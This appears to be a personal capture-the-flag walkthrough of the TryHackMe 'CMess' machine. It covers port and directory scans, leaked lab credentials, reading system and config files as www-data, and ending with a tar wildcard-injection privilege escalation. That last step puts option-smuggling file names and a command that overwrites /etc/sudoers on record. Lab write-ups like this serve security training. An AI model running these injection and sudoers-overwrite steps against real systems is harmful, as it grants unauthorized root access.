
Start with `rustscan`
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme]
└─$ rustscan -a $IP --ulimit 5000 --range 1-65000 -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/bopbap/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.204.151:22
Open 10.10.204.151:80
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 05:48 EDT
Initiating Ping Scan at 05:48
Scanning 10.10.204.151 [2 ports]
Completed Ping Scan at 05:48, 0.35s elapsed (1 total hosts)
Initiating Connect Scan at 05:48
Scanning cmess.thm (10.10.204.151) [2 ports]
Discovered open port 22/tcp on 10.10.204.151
Discovered open port 80/tcp on 10.10.204.151
Completed Connect Scan at 05:48, 0.28s elapsed (2 total ports)
Nmap scan report for cmess.thm (10.10.204.151)
Host is up, received syn-ack (0.33s latency).
Scanned at 2023-07-23 05:48:06 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds


┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme]
└─$
```

`nmap`

```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/cmess]
└─$ nmap -sC -sV -p- $IP -T4 -o nmap_full.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 05:49 EDT
Nmap scan report for cmess.thm (10.10.204.151)
Host is up (0.25s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9b652d3939a3850b4233bfd210c051f (RSA)
|   256 21c36e318b85228a6d72868fae64662b (ECDSA)
|_  256 5bb9757805d7ec43309617ffc6a86ced (ED25519)
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 3 disallowed entries
|_/src/ /themes/ /lib/
|_http-generator: Gila CMS
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
16790/tcp filtered unknown
23344/tcp filtered unknown
61893/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1196.37 seconds
```

`robots.txt`
```sh
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
```

`ffuf`
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/cmess]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://cmess.thm/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cmess.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 250ms]
    * FUZZ: .hta

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 250ms]
    * FUZZ: .htaccess

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 253ms]
    * FUZZ: .htpasswd

[Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 285ms]
    * FUZZ: 0

[Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 273ms]
    * FUZZ: 1

[Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 305ms]
    * FUZZ: 01

[Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 254ms]
    * FUZZ: 1x1

[Status: 200, Size: 3339, Words: 372, Lines: 93, Duration: 263ms]
    * FUZZ: About

[Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 256ms]
    * FUZZ: Index

[Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 252ms]
    * FUZZ: Search

[Status: 200, Size: 3353, Words: 372, Lines: 93, Duration: 251ms]
    * FUZZ: about

[Status: 200, Size: 1580, Words: 377, Lines: 42, Duration: 247ms]
    * FUZZ: admin

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 246ms]
    * FUZZ: api

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 244ms]
    * FUZZ: api/experiments

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 245ms]
    * FUZZ: api/experiments/configurations

[Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 242ms]
    * FUZZ: assets

[Status: 200, Size: 3590, Words: 419, Lines: 102, Duration: 250ms]
    * FUZZ: author

[Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 260ms]
    * FUZZ: blog

[Status: 200, Size: 3862, Words: 522, Lines: 110, Duration: 270ms]
    * FUZZ: category

[Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 248ms]
    * FUZZ: cm

[Status: 200, Size: 735, Words: 37, Lines: 22, Duration: 250ms]
    * FUZZ: feed

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 247ms]
    * FUZZ: fm

[Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 259ms]
    * FUZZ: index

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 245ms]
    * FUZZ: lib

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 243ms]
    * FUZZ: log

[Status: 200, Size: 1580, Words: 377, Lines: 42, Duration: 246ms]
    * FUZZ: login

[Status: 200, Size: 65, Words: 5, Lines: 5, Duration: 248ms]
    * FUZZ: robots.txt

[Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 255ms]
    * FUZZ: search

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 251ms]
    * FUZZ: server-status

[Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 245ms]
    * FUZZ: sites

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 244ms]
    * FUZZ: src

[Status: 200, Size: 3874, Words: 523, Lines: 110, Duration: 251ms]
    * FUZZ: tag

[Status: 200, Size: 3139, Words: 337, Lines: 85, Duration: 252ms]
    * FUZZ: tags

[Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 244ms]
    * FUZZ: themes

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 244ms]
    * FUZZ: tmp

:: Progress: [4713/4713] :: Job [1/1] :: 159 req/sec :: Duration: [0:00:30] :: Errors: 0 ::

┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/cmess]
└─$
```

`dev.cmess.thm`

```sh
Development Log
andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%

```


```
andre@cmess.thm
KPFTN_f2yxe%
```
`Gila CMS version 1.10.9 `

We got shell. https://www.exploit-db.com/exploits/51569

```sh
www-data@cmess:/var/www/html/tmp$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
andre:x:1000:1000:andre,,,:/home/andre:/bin/bash
mysql:x:108:117:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
www-data@cmess:/var/www/html/tmp$
```


`config.php`
```php
www-data@cmess:/var/www/html$ cat config.php
cat config.php
<?php

$GLOBALS['config'] = array (
  'db' =>
  array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
  'permissions' =>
  array (
    1 =>
    array (
      0 => 'admin',
      1 => 'admin_user',
      2 => 'admin_userrole',
    ),
  ),
  'packages' =>
  array (
    0 => 'blog',
  ),
  'base' => 'http://cmess.thm/gila/',
  'theme' => 'gila-blog',
  'title' => 'Gila CMS',
  'slogan' => 'An awesome website!',
  'default-controller' => 'blog',
  'timezone' => 'America/Mexico_City',
  'ssl' => '',
  'env' => 'pro',
  'check4updates' => 1,
  'language' => 'en',
  'admin_email' => 'andre@cmess.thm',
  'rewrite' => true,
);www-data@cmess:/var/www/html$
```

```sh
www-data@cmess:/var/www$ cat /etc/os-release
cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

```sh
www-data@cmess:/opt$ cat .password.bak
cat .password.bak
andres backup password
UQfsdCB7aAP6
www-data@cmess:/opt$
```


```sh
./pspy64 -pf -i 1000
```

`crontab`
```sh
andre@cmess:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
andre@cmess:/$
```

`privesc`
https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e

We got root
```sh
echo 'echo "andre ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh  
echo "" > "--checkpoint-action=exec=sh privesc.sh"  
echo "" > --checkpoint=1
```